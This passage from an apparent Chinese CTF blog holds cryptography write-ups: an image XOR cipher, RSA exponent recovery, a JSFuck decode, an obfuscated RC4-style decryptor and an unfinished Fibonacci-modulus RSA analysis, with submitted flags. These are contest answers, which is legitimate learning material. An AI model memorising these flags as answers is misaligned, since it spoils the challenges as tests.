class="number">22000</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 64个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = <span class="number">24</span></span><br><span class="line">n = <span class="number">16</span></span><br><span class="line">r = <span class="number">1.2</span></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">x0 = <span class="number">0.840264</span></span><br><span class="line">num = m*n//<span class="number">8</span></span><br><span class="line">seqs = []</span><br><span class="line">x = x0</span><br><span class="line">bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">    x = generate(x)</span><br><span class="line">    tmp.append(x)</span><br><span class="line">    seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">    bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">        bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">    bins += bin_x</span><br><span class="line"><span class="built_in">print</span>(bins)</span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 256个零</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        index = n*i+j</span><br><span class="line">        ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># pix = pixel[index]</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix = <span class="number">169</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = <span class="number">86</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = <span class="number">78</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = <span class="number">177</span></span><br><span class="line">        cipher[index] = pix</span><br><span class="line"></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line">bins = <span class="string">&#xx27;</span></span><br><span class="line">cipher = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 384个零</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        index = n*i+j</span><br><span class="line">        ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">        pix = encrypt_flagimage[index]</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">            pix = (pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">            pix = (~pix ^ key1) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">            pix = (pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">            pix = (~pix ^ key2) &amp; <span class="number">0xff</span></span><br><span class="line">        cipher[index] = pix</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> cipher])</span><br><span class="line"><span class="built_in">print</span>(hashlib.md5(data.encode()).hexdigest())</span><br></pre></td></tr></table></figure>

<p>然后算出来和队伍的另外一位师傅（另外一个组员）解出来的image有一位不一样，应该是解密的问题，现在也截止了，没办法验证了</p>
<p>最后那位师傅又搞了一遍出来和我一样了，但依旧不知道是哪里错了</p>
<p>然后赛后看WP是先把数字转字节，然后拼接起来转md5的，很怪，为什么不用题目给的方式转换呢？？？</p>
<p>耶不爽</p>
<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>同样也忘记名字了</p>
<p>反正就基础的RSA攻击</p>
<p>最后把雪莱的诗md5一下就好了，太麻烦了不想写</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>不行，满打满算才做出三道，还木大木大</p>
<p>我必须变得更加饥渴</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210523 宁波市第四届网络安全大赛Crypto方向WP</title>
    <url>/posts/a428a61f/</url>
    <content><![CDATA[<p>emmmmm前三届是怎么办起来的</p>
<span id="more"></span>

<h1 id="2021宁波市第四届网络安全大赛"><a href="#2021宁波市第四届网络安全大赛" class="headerlink" title="2021宁波市第四届网络安全大赛"></a>2021宁波市第四届网络安全大赛</h1><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>开始还以为题目错了，出题人还是很严谨的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">黑板上写着一道题：</span><br><span class="line">p=6FBC2F9E39</span><br><span class="line">q=44CF33</span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">求d？</span><br><span class="line">答案就是flag</span><br></pre></td></tr></table></figure>

<p>其实这些都是16进制的，然后求出来的d也要转换成16进制的大写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">p = <span class="number">0x6FBC2F9E39</span></span><br><span class="line">q = <span class="number">0x44CF33</span></span><br><span class="line">e = <span class="number">0x17</span></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(hex(d).upper())</span></span><br><span class="line">m = hashlib.md5(<span class="built_in">hex</span>(d).upper()[<span class="number">2</span>:].encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(m.upper())</span><br></pre></td></tr></table></figure>

<p>出来是这样</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">479A4D532737AC1EC3640F85E375B659</span><br></pre></td></tr></table></figure>

<p>包上flag{}就好</p>
<h3 id="简单编码"><a href="#简单编码" class="headerlink" title="简单编码"></a>简单编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>

<p>jsFuck丢进浏览器console里输出一下，得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">119178353342323</span><br></pre></td></tr></table></figure>

<p>直接转还错了，瞎猜样地转了下bytes，竟然没有乱码，绝逼是它了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">t = <span class="number">119178353342323</span></span><br><span class="line"><span class="comment"># t = long_to_bytes(t)</span></span><br><span class="line">m = hashlib.md5(<span class="string">&#x27;ld_jws&#x27;</span>.encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(m.upper())</span><br></pre></td></tr></table></figure>

<p>最终得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;1E8FB0BC2025429CC885D2F794A89EB8&#125;</span><br></pre></td></tr></table></figure>

<h3 id="nike"><a href="#nike" class="headerlink" title="nike"></a>nike</h3><p>恶心，抄别人题目<a href="https://blog.csdn.net/qq_41252520/article/details/101227790">原题</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> __operator, __<span class="built_in">print</span>, __g, __y: [(sys.setrecursionlimit(<span class="number">1000000</span>), [[[[[(decode(cipher), <span class="literal">None</span>)[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;cipher&#x27;</span>] <span class="keyword">in</span> [(<span class="string">&#x27;D6VNEIRAryZ8Opdbl3bOwqmBD+lmFXbcd/XfgHalqYBh1FDtbJo=&#x27;</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;decode&#x27;</span>], decode.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> cipher: (<span class="keyword">lambda</span> __l: [(init(), [[[(<span class="keyword">lambda</span> __after: (__<span class="built_in">print</span>(<span class="string">&#x27;sorry,you dont have the auth&#x27;</span>), <span class="number">0</span>)[<span class="number">1</span>] <span class="keyword">if</span> (__l[<span class="string">&#x27;auth&#x27;</span>] == <span class="number">1</span>) <span class="keyword">else</span> __after())(<span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __items, __after, __sentinel: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [[__this() <span class="keyword">for</span> __l[<span class="string">&#x27;result&#x27;</span>] <span class="keyword">in</span> [(__operator.iadd(__l[<span class="string">&#x27;result&#x27;</span>], <span class="built_in">chr</span>((s[(__l[<span class="string">&#x27;i&#x27;</span>] % <span class="number">256</span>)] ^ <span class="built_in">ord</span>(__l[<span class="string">&#x27;cipher&#x27;</span>][__l[<span class="string">&#x27;i&#x27;</span>]])))))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;i&#x27;</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(<span class="built_in">next</span>(__items, __sentinel)))())(<span class="built_in">iter</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(__l[<span class="string">&#x27;cipher&#x27;</span>]))), <span class="keyword">lambda</span>: (__<span class="built_in">print</span>(__l[<span class="string">&#x27;result&#x27;</span>].encode(<span class="string">&#x27;base64&#x27;</span>)), <span class="literal">None</span>)[<span class="number">1</span>], [])) <span class="keyword">for</span> __l[<span class="string">&#x27;auth&#x27;</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;cipher&#x27;</span>] <span class="keyword">in</span> [(__l[<span class="string">&#x27;cipher&#x27;</span>].decode(<span class="string">&#x27;base64&#x27;</span>))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;result&#x27;</span>] <span class="keyword">in</span> [(<span class="string">&#x27;&#x27;</span>)]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;cipher&#x27;</span>] <span class="keyword">in</span> [(cipher)]][<span class="number">0</span>])(&#123;&#125;), <span class="string">&#x27;decode&#x27;</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;init&#x27;</span>], init.__name__ <span class="keyword">in</span> [(<span class="keyword">lambda</span> : (<span class="keyword">lambda</span> __l: [[(<span class="keyword">lambda</span> __items, __after, __sentinel: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [(s.append(__l[<span class="string">&#x27;i&#x27;</span>]), (k.append(<span class="built_in">ord</span>(__l[<span class="string">&#x27;key&#x27;</span>][(__l[<span class="string">&#x27;i&#x27;</span>] % <span class="built_in">len</span>(__l[<span class="string">&#x27;key&#x27;</span>]))])), __this())[<span class="number">1</span>])[<span class="number">1</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;i&#x27;</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(<span class="built_in">next</span>(__items, __sentinel)))())(<span class="built_in">iter</span>(<span class="built_in">range</span>(<span class="number">256</span>)), <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __items, __after, __sentinel: __y(<span class="keyword">lambda</span> __this: <span class="keyword">lambda</span>: (<span class="keyword">lambda</span> __i: [[[[[__this() <span class="keyword">for</span> s[__l[<span class="string">&#x27;j&#x27;</span>]] <span class="keyword">in</span> [(__l[<span class="string">&#x27;tmp&#x27;</span>])]][<span class="number">0</span>] <span class="keyword">for</span> s[__l[<span class="string">&#x27;i&#x27;</span>]] <span class="keyword">in</span> [(s[__l[<span class="string">&#x27;j&#x27;</span>]])]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;tmp&#x27;</span>] <span class="keyword">in</span> [(s[__l[<span class="string">&#x27;i&#x27;</span>]])]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;j&#x27;</span>] <span class="keyword">in</span> [((((__l[<span class="string">&#x27;j&#x27;</span>] + s[__l[<span class="string">&#x27;i&#x27;</span>]]) + k[__l[<span class="string">&#x27;i&#x27;</span>]]) % <span class="number">256</span>))]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;i&#x27;</span>] <span class="keyword">in</span> [(__i)]][<span class="number">0</span>] <span class="keyword">if</span> __i <span class="keyword">is</span> <span class="keyword">not</span> __sentinel <span class="keyword">else</span> __after())(<span class="built_in">next</span>(__items, __sentinel)))())(<span class="built_in">iter</span>(<span class="built_in">range</span>(<span class="number">256</span>)), <span class="keyword">lambda</span>: <span class="literal">None</span>, []), []) <span class="keyword">for</span> __l[<span class="string">&#x27;j&#x27;</span>] <span class="keyword">in</span> [(<span class="number">0</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __l[<span class="string">&#x27;key&#x27;</span>] <span class="keyword">in</span> [(<span class="string">&#x27;aV9hbV9ub3RfZmxhZw==&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))]][<span class="number">0</span>])(&#123;&#125;), <span class="string">&#x27;init&#x27;</span>)]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;k&#x27;</span>] <span class="keyword">in</span> [([])]][<span class="number">0</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;s&#x27;</span>] <span class="keyword">in</span> [([])]][<span class="number">0</span>])[<span class="number">1</span>] <span class="keyword">for</span> __g[<span class="string">&#x27;sys&#x27;</span>] <span class="keyword">in</span> [(<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>, __g, __g))]][<span class="number">0</span>])(<span class="built_in">__import__</span>(<span class="string">&#x27;operator&#x27;</span>, level=<span class="number">0</span>), <span class="built_in">__import__</span>(<span class="string">&#x27;__builtin__&#x27;</span>, level=<span class="number">0</span>).__dict__[<span class="string">&#x27;print&#x27;</span>], <span class="built_in">globals</span>(), (<span class="keyword">lambda</span> f: (<span class="keyword">lambda</span> x: x(x))(<span class="keyword">lambda</span> y: f(<span class="keyword">lambda</span>: y(y)()))))</span><br></pre></td></tr></table></figure>

<p>写在一行了</p>
<p>按照原题的改就好，虽然不知道为什么有红线报错还是能运行</p>
<p>出来一个base64转一下，得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;2BD8A9A8E61F7B31C1D46B387CB0278D&#125;</span><br></pre></td></tr></table></figure>

<p>但是这个交不上，然后用python2运行他给我们的脚本，发现出来的base64有些许不同</p>
<p>好家伙，原来是魔改</p>
<p>最后得到的是，只有几位之差</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;2BD8A9A8E61F7B31C1D46O1X7CB0278D&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>然后Crypto就没出题了，都古典，做了几个没啥兴致，也没啥思路了</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>有道宁波训练赛的题目，找到wp，感觉加密方式也挺新颖的，摘记下</p>
<h3 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h3><img alt="20210523 前方到站宁波站-09be9b5a.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210523 前方到站宁波站-09be9b5a.png" width="" height="" >

<p>完全没思路，看师傅的吧</p>
<img alt="20210523 前方到站宁波站-1c21d9b3.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210523 前方到站宁波站-1c21d9b3.png" width="" height="" >

<p>挺经典的，但不知道这种加密叫什么，就是一般的二维表格吧也不是，有点像playfair，但又不完全像，希望知道的师傅带带我这只小菜鸡吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210529 DASCTFXBUUOJ五月大联动Crypto方向部分WP</title>
    <url>/posts/88b63128/</url>
    <content><![CDATA[<p>不是部分啦，就一道呜呜呜，但是草鸡详细哦</p>
<p>xs，我tm根本登不进去，报名时出了点问题</p>
<p>最后直接看别人发在群里的题目了</p>
<p>总共有三题，一道完全不懂，一道好像是椭圆曲线的RelatedMessage，反正就这道题有点思路，因为找到一篇关于斐波那契是RSA模数的论文，打算借此机会研究一下</p>
<span id="more"></span>

<h1 id="DASCTF-X-BUUOJ-五月大联动"><a href="#DASCTF-X-BUUOJ-五月大联动" class="headerlink" title="DASCTF X BUUOJ 五月大联动"></a>DASCTF X BUUOJ 五月大联动</h1><h2 id="Fibonacci"><a href="#Fibonacci" class="headerlink" title="Fibonacci"></a>Fibonacci</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">flag=<span class="string">&#x27;flag&#123;*************************&#125;&#x27;</span></span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> F(n - <span class="number">1</span>) + F(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    p=getPrime(<span class="number">8</span>)</span><br><span class="line">    q=getPrime(<span class="number">1024</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    F=F(n)</span><br><span class="line">    c=<span class="built_in">pow</span>(m,<span class="number">65537</span>,F)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;n = %d&#x27;</span>%(n))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;F(n) = %d&#x27;</span>%(F))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;c = %d&#x27;</span>%(c))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 30039002188673063651200304724856649750424855614713561659816258454033925531379709006718595334296516241593158998074215212142272196270365664747873959581114872378007750905526355257967620809790424857457592189785708634246739647422565451143815984036502331156971328504879840492056807034649796388685443055568787638373563</span></span><br><span class="line"><span class="string">F(n) = 36700337315478358423302463804643502364132894595387679831392170242048570294154137205916046749632259595443511772051005890145681246611711817441148722686433058905309178967626876196428817911402628279151882749816176290631663850711266005570519120688501046610172118214633159846090742563888545000820131558915392759986137704413717356161549696109102298045171982651759736931461029700093546074544216714411268154766313965335118439291477901688458760307733751977411099481922798986947005456033024215394531788003343093192780270571980899284495530589488614458267489897774350955741276841747926401364869628844871476483816139224540693572750083532852690939679488779770278121521966166639184387859708670915429469804929002101080867694318638835470062005769336931710061708165085286293560882862673863182161513175108975599928164057840378446866053785509135134250439675861761412916432659950998041079347609299108756058982586701419597870024243472621875398244582253182771532237956030075796524234449649579003219049</span></span><br><span class="line"><span class="string">c = 5149579488901718498256373861975221458889060262051324713153792274531569740959338672159468511041469512968513162060650323314015111729630790249929764405001469068728832250672432536655958494683225528045534739312500520653653926107616626321646038503307002215682827882897681738805565989931916973526625237494508575698650414426281874530049741540818321302625573676530536769431267223818807952634410781018835593002628264062168865877875709419051886274533984009771861504132373726000546543208681246415153517353772565209140561174813777886487077708362479762600413004602240042298109893816953817393105259401510845057279294044756541864350957113952935658077279981571022227194710269040317178329523984989277421087981594122731035549685470894608888049815174440061043045638797036874542111575347820490125255592416295645107767029867230219384632544284156692872055786752135888144873738488840255388898851551453544530082551649823629868841430161794325580654855230486824210856918330348898081161664747016870749921</span></span><br><span class="line"><span class="string">n = 20756277616755836861796337131683494338352701206928094011019872107808330954223862907177555525893261715593610455375647872190101833907080699823790147515155417500649420182409578349022597139001229776650770207829659368291648098353474620323733162983388953788239424626462428488411835382477744747369092196172727799468129</span></span><br><span class="line"><span class="string">F(n) = 73745878045934636387896195274069826551569516766963182339313590908194755029865664679120132471843611642027469204171633501721641080925317635658799561477123939207311526297390646712571316606381873782191178958234889168599083479590822672109275622907151415552207811665808203751267410151224170154736841450903230193274146578562848780223022725054392389915985290416059522271191922854734627854849084277940339695243325424932830011581455271309868481867791848671985869262214017536640985196012788793460756899871516178490553441223897250090614367273308559864669269965578509523152119870676641602044879271520652270508502838994825168113044092631541016378753797168654004397854528716878554680966919397339024634461107466963998140873416841269245629405227723896214356538994142798927935847118081299628628813983021407779086407107873835131175157418129203731497042769363491200520978441329400751265966093987214492433690588592278950077342020700742819163199408329926294779182691364743193734488228719</span></span><br><span class="line"><span class="string">c = 5893676968379648852677257584942191109596695953257511502221493623707657958793151928063695511404323761502093871747314475680963368412056002167272056988434183588136518540030328900237814175026374170035752147457944130025788557913749495512316872731640598728203711834687604349623497761823630666336599012384701148134898626277451946739191645056229526840490101366707716010899628734677395956010814780086058428182227433879240458756480238286363782312887091585752283137070930652073681891561066188131229432708558323016170835880200185835314330898745048592325798107333894598294876001536344275083054913481975007098183772410065580414486344966276992142840553960291265334551415769700709112077959058690472699228393932778693676888105307493544864165340738016954896582284163878309410561472175085522432252484026380738098291004277354471010420592137620174716251226560188793137038378169674648650109100511358090004029326014324282641470675210622193652390362972072927753788251933923336522541020538</span></span><br><span class="line"><span class="string">n = 23691611795512881548876576490920777356012500842496810447368465555253207159934330531730113872431842020621324344446142448954349963332039143377219840904377051014940314330764948944111930704132580375788932310940376348012980840541573284360163056070088226098587825855247120630453584914813593602869923553994121677913829</span></span><br><span class="line"><span class="string">F(n) = 9354120234373821188002721174172376187851074553842250946994966454521076364770447254561289329644492544492363073660918209867635665556179493971516453831575577085229601305613934033279832212516762995062790158649731235328923025944567754094837437882988453755837757140503680845082446605924488438186342529892438539978025244619294478667640323307281530468578326413724432442367286795555698768396763148070646067431485983937912884160277380848384622618517411849896779104223556934427313741222400162647303864273804545658096365574243669367638797710979775090679277794669009497301787205587916669811596486681600927221914751277959719025890975947906807551671033707046998050580404291266129815613731776357171701993365320613177014644670728884401252046842886254766791009584832861321307145962353061550438485818190867215102212015602783104130507243211654301408379888922865198634687009616395466846020452426608653076648665616711357303753242673389482755201639605067581161306428053985480749</span></span><br><span class="line"><span class="string">c = 5527295227051355798054266434992298352109856653351231751774366060474987674395801103779017995136358984850596693033786379284945829600181195650018576473832122123689374306357799469703873467631828582340852591088516097040696492555053370228278729688979599727840615379716837557947979105109295383721874687464666950312431293310758869315198932080703658526964530199675712576963592684818247111162090363056774275409164410925950049724140156220797817319956734605599349828169364123443161210061751433895202659075589086208524908238147473041649043519688635549021052796213275288198028578858764052136199721656697612607002863436475864686744976361468007786764828741313027638038039869019572535344397813504142312113571484580538973034322648843004665888312135523153988203801290669186909018156540165112741651436700837185946879899717245458101182522362705139925914797396797181901663790903646171709744845258954151859189108531243389446981087547490853432279034430995853488274409450850672046</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>有意识去查论文，没能力去读论文</p>
<h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><h4 id="漫漫求学路"><a href="#漫漫求学路" class="headerlink" title="漫漫求学路"></a>漫漫求学路</h4><p>看了题目，发现是将Fibonacci数列中的三个数作为模数了，第一时间想到的就是典型论文题，于是我直接baidu，发现了题目的出处</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-1fcd93e4.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-1fcd93e4.png" width="" height="" >

<p>摘要里说，这样子RSA加密是很容易被攻击的，所以再次坚信我找对了</p>
<p>但是这篇论文要收费，屑</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-cc50866c.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-cc50866c.png" width="" height="" >

<p>但是没有困难的狗狗，只有勇敢的问题，我们去找了老师，毕竟是研究RSA的，必定听过这类的攻击，或者说有相应的文献</p>
<p>果不其然，入场券到手</p>
<h4 id="漫漫求学路2"><a href="#漫漫求学路2" class="headerlink" title="漫漫求学路2"></a>漫漫求学路2</h4><p>论文并不长</p>
<p>第一点是说，如果用来作为模数n的斐波那契数在斐波那契序列中是排偶数位，那么这个n就可以分解成一个斐波那契数和一个卢卡斯数</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-07048377.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-07048377.png" width="" height="" >

<p>但这不是我们所需要的，因为题目里的n都是奇数</p>
<p>唯一找到有用一点的信息就是，</p>
<p>第$r$位置的斐波那契数$U_r$和第$s$位置的斐波那契数$U_s$，如果$r$整除$s$，则$U_r$整除$U_s$</p>
<p>题目所给的数据也确实能$P_i$被整除，但若是要完全分解，木大木大</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-95dc5fb2.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-95dc5fb2.png" width="" height="" >

<p>这里还说上面那个是充要条件</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-103c3baf.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-103c3baf.png" width="" height="" >

<img alt="20210529 DASCTFXBUUOJ五月大联动-4e045ef8.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-4e045ef8.png" width="" height="" >

<hr>
<p>麻了，看个der论文，网上找了（算法没学好，拼不过acm的）一个脚本，算出了第13000斐波那契数，都已经是小三千位的了，而我们题目给的数据才一千位都不到。吼吼吼吼，这题别（jiù）有（shì）洞（tào）天（lù）</p>
<img alt="20210529 DASCTFXBUUOJ五月大联动-f5e65eda.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DASCTFXBUUOJ五月大联动-f5e65eda.png" width="" height="" >

